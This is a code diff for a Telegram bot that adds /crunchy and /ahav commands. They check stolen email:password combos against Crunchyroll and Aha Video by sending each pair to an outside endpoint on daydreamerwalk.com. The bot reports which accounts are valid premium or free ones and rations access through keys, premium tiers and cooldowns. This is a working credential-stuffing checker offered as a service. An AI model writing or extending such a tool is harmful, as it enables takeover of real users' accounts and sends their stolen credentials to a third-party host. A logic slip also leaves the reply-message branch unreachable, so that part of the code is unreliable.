@@ -260,8 +260,10 @@ def main():
                 response = formatMessage(response)
                 await client.send_message(-1001769821742, response, link_preview=False)
 
-        @client.on(events.NewMessage(pattern=r"^(?:@xCatBurglar /crunchy|/crunchy)"))
-        async def handler(event):
+        async def crunchy_gate(event):
+            global POOL
+            editMessage = None
+            shouldEditMessage = False
             results = findall(r"([a-zA-Z0-9_\-\.]+@.*)\:(.*)", event.raw_text)
             key = findall(r"ACCESS [A-Z0-9]{16}", event.raw_text)
             haveKey = False
@@ -283,14 +285,15 @@ def main():
                 membership = "ᴀᴜᴛʜ"
             if not len(results) >= 1:
                 return
-            if len(results) > 1 or event.is_private:
-                if not user in premium_users and not haveKey:
+            
+            if not len(results) >= 1:
+                if not event.reply_to:
                     res = f"""
                     [✯] 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 
-                    ━━━━━━━━━━━━━━━━
-                    [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ ‼`
-                    [✯] **ᴍᴇꜱꜱᴀɢᴇ** ↯ `ɴᴏ ᴀᴄᴄᴇꜱꜱ ᴋᴇʏ ꜰᴏᴜɴᴅ ‼`
-                    ━━━━━━━━━━━━━━━━
+                    ━━━━━━━━━━━━━━━━━━━━━━━━━
+                    [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `ɴᴏ ᴄᴏᴍʙᴏ ꜰᴏᴜɴᴅ ‼`
+                    [✯] **ꜰᴏʀᴍᴀᴛ** ↯ `/ᴄʀᴜɴᴄʜʏ ᴇᴍᴀɪʟ:ᴘᴀꜱꜱᴡᴏʀᴅ ‼`
+                    ━━━━━━━━━━━━━━━━━━━━━━━━━
                     [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
                     [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{user} [{membership}]
                     [✯] **ᴀᴘɪ ʙʏ** ↯ @hellrip
@@ -298,7 +301,49 @@ def main():
                     res = formatMessage(res)
                     await event.reply(res)
                     return
+                else:
+                    replied = await event.get_reply_message()
+                    text = replied.raw_text
+                    results = findall(r"([a-zA-Z0-9_\-\.]+@.*)\:(.*)", text)
+            
+            if len(results) > 1 or event.is_private:
+                if not user in premium_users and not haveKey:
+                    res = f"""
+                    [✯] 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 
+                    ━━━━━━━━━━━━━━━━━━━━━━━━━
+                    [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ ‼`
+                    [✯] **ᴍᴇꜱꜱᴀɢᴇ** ↯ `ɴᴏ ᴀᴄᴄᴇꜱꜱ ᴋᴇʏ ꜰᴏᴜɴᴅ ‼`
+                    ━━━━━━━━━━━━━━━━━━━━━━━━━
+                    [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
+                    [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{user} [{membership}]
+                    [✯] **ᴀᴘɪ ʙʏ** ↯ @hellrip
+                    [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
+                    res = formatMessage(res)
+                    await event.reply(res)
+                    return
+            
             for result in results:
+
+                if not POOL.get(user) == None:
+                    cooldown = time() - POOL.get(user)
+                    m_cooldown = 10
+                    if user == "x4rju9":
+                        m_cooldown = 2
+                    elif user in premium_users:
+                        m_cooldown = 5
+                    elif haveKey:
+                        m_cooldown = 7
+                    if cooldown < m_cooldown:
+                        cooldown = m_cooldown-cooldown
+                        editMessage = await event.reply(f"ᴄᴏᴏʟᴅᴏᴡɴ ꜰᴏʀ: {round(cooldown, 2)} ꜱᴇɢᴜɴᴅᴏꜱ ⏳")
+                        shouldEditMessage = True
+                        if user in premium_users:
+                            await asyncio.sleep(cooldown)
+                        else:
+                            return
+                    else:
+                        del POOL[user]
+                
                 uEmail = result[0]
                 uPass = result[1]
                 url = f"https://daydreamerwalk.com/c.php?e={uEmail}&p={uPass}"
@@ -330,17 +375,165 @@ def main():
                     uPass = f"\n{uPass}"
                 res = f"""
                 [✯] 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 
-                ━━━━━━━━━━━━━━━━
+                ━━━━━━━━━━━━━━━━━━━━━━━━━
                 [✯] **ᴇᴍᴀɪʟ** ↯ `{uEmail}`
                 [✯] **ᴘᴀꜱꜱ** ↯ `{uPass}`
                 [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `{status}`
-                ━━━━━━━━━━━━━━━━
+                ━━━━━━━━━━━━━━━━━━━━━━━━━
                 [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
                 [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{user} [{membership}]
                 [✯] **ᴀᴘɪ ʙʏ** ↯ @hellrip
                 [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
                 res = formatMessage(res)
-                await event.reply(res)
+                if shouldEditMessage:
+                    await editMessage.edit(res)
+                    editMessage = None
+                    shouldEditMessage = False
+                else:
+                    await event.reply(res)
+                POOL[user] = time()
+        
+        @client.on(events.NewMessage(pattern=r"^/crunchy"))
+        async def crunchy_handler(event):
+            asyncio.create_task(crunchy_gate(event))
+        
+        async def ahav_gate(event):
+            global POOL
+            editMessage = None
+            shouldEditMessage = False
+            results = findall(r"([a-zA-Z0-9_\-\.]+@.*)\:(.*)", event.raw_text)
+            key = findall(r"ACCESS [A-Z0-9]{16}", event.raw_text)
+            haveKey = False
+            if len(key) >= 1:
+                key = key[0]
+                if key == ACCESS_KEY:
+                    haveKey = True
+            # Getting the sender infor to extract the username
+            user = await event.get_sender()
+            user = user.username
+            # Membership status
+            membership = "𝙵𝚁𝙴𝙴"
+            # Setting membership status based on the who accesses it
+            if user == "x4rju9":
+                membership = "𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁"
+            elif user in premium_users:
+                membership = "𝙿𝚁𝙴𝙼𝙸𝚄𝙼"
+            elif haveKey:
+                membership = "ᴀᴜᴛʜ"
+            if not len(results) >= 1:
+                return
+            
+            if not len(results) >= 1:
+                if not event.reply_to:
+                    res = f"""
+                    [✯] 𝗔𝗛𝗔 𝗩𝗜𝗗𝗘𝗢 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥
+                    ━━━━━━━━━━━━━━━━━━━━━━━━
+                    [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `ɴᴏ ᴄᴏᴍʙᴏ ꜰᴏᴜɴᴅ ‼`
+                    [✯] **ꜰᴏʀᴍᴀᴛ** ↯ `/ᴀʜᴀᴠ ᴇᴍᴀɪʟ:ᴘᴀꜱꜱᴡᴏʀᴅ ‼`
+                    ━━━━━━━━━━━━━━━━━━━━━━━━
+                    [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
+                    [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{user} [{membership}]
+                    [✯] **ᴀᴘɪ ʙʏ** ↯ @hellrip
+                    [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
+                    res = formatMessage(res)
+                    await event.reply(res)
+                    return
+                else:
+                    replied = await event.get_reply_message()
+                    text = replied.raw_text
+                    results = findall(r"([a-zA-Z0-9_\-\.]+@.*)\:(.*)", text)
+            
+            if len(results) > 1 or event.is_private:
+                if not user in premium_users and not haveKey:
+                    res = f"""
+                    [✯] 𝗔𝗛𝗔 𝗩𝗜𝗗𝗘𝗢 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 
+                    ━━━━━━━━━━━━━━━━━━━━━━━━━
+                    [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ ‼`
+                    [✯] **ᴍᴇꜱꜱᴀɢᴇ** ↯ `ɴᴏ ᴀᴄᴄᴇꜱꜱ ᴋᴇʏ ꜰᴏᴜɴᴅ ‼`
+                    ━━━━━━━━━━━━━━━━━━━━━━━━━
+                    [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
+                    [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{user} [{membership}]
+                    [✯] **ᴀᴘɪ ʙʏ** ↯ @hellrip
+                    [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
+                    res = formatMessage(res)
+                    await event.reply(res)
+                    return
+            
+            for result in results:
+
+                if not POOL.get(user) == None:
+                    cooldown = time() - POOL.get(user)
+                    m_cooldown = 10
+                    if user == "x4rju9":
+                        m_cooldown = 2
+                    elif user in premium_users:
+                        m_cooldown = 5
+                    elif haveKey:
+                        m_cooldown = 7
+                    if cooldown < m_cooldown:
+                        cooldown = m_cooldown-cooldown
+                        editMessage = await event.reply(f"ᴄᴏᴏʟᴅᴏᴡɴ ꜰᴏʀ: {round(cooldown, 2)} ꜱᴇɢᴜɴᴅᴏꜱ ⏳")
+                        shouldEditMessage = True
+                        if user in premium_users:
+                            await asyncio.sleep(cooldown)
+                        else:
+                            return
+                    else:
+                        del POOL[user]
+                
+                uEmail = result[0]
+                uPass = result[1]
+                url = f"https://daydreamerwalk.com/aha.php?e={uEmail}&p={uPass}"
+                # Response from the server
+                response = requests.post(url=url)
+                # Response of whether the credentials are valid or invalid
+                # Password security: whether to hide or not
+                status = "ᴄʀᴇᴅᴇɴᴛɪᴀʟꜱ ᴍɪꜱᴍᴀᴛᴄʜ ‼"
+                if len(uPass) > 20:
+                    uPass = uPass[0:20]
+                if "premium" in response.text:
+                    status = "ᴀᴘᴘʀᴏᴠᴇᴅ ᴘʀᴇᴍɪᴜᴍ ✅"
+                    if not event.is_private:
+                        oLength = len(uPass)
+                        length = oLength // 2
+                        track = []
+                        for x in range(length):
+                            i = randint(0, oLength-1)
+                            while i in track:
+                                i = randint(0, oLength-1)
+                            track.append(i)
+                            uPass = uPass[0:i] + "X" + uPass[i+1:]
+                elif "good" in response.text:
+                    status = "ꜰʀᴇᴇ ᴀᴄᴄᴏᴜɴᴛ ✅"
+                # Creating Response Format
+                if len(uEmail) > 25:
+                    uEmail = f"\n{uEmail}"
+                if len(uPass) > 22:
+                    uPass = f"\n{uPass}"
+                res = f"""
+                [✯] 𝗔𝗛𝗔 𝗩𝗜𝗗𝗘𝗢 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 
+                ━━━━━━━━━━━━━━━━━━━━━━━━━
+                [✯] **ᴇᴍᴀɪʟ** ↯ `{uEmail}`
+                [✯] **ᴘᴀꜱꜱ** ↯ `{uPass}`
+                [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `{status}`
+                ━━━━━━━━━━━━━━━━━━━━━━━━━
+                [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
+                [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{user} [{membership}]
+                [✯] **ᴀᴘɪ ʙʏ** ↯ @hellrip
+                [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
+                res = formatMessage(res)
+                res = formatMessage(res)
+                if shouldEditMessage:
+                    await editMessage.edit(res)
+                    editMessage = None
+                    shouldEditMessage = False
+                else:
+                    await event.reply(res)
+                POOL[user] = time()
+        
+        @client.on(events.NewMessage(pattern=r"^/ahav"))
+        async def ahav_handler(event):
+            asyncio.create_task(ahav_gate(event))
 
         gemini_question_pattern = r"^(?:/google|/kulfi|/ask)"
         @client.on(events.NewMessage(pattern=gemini_question_pattern))
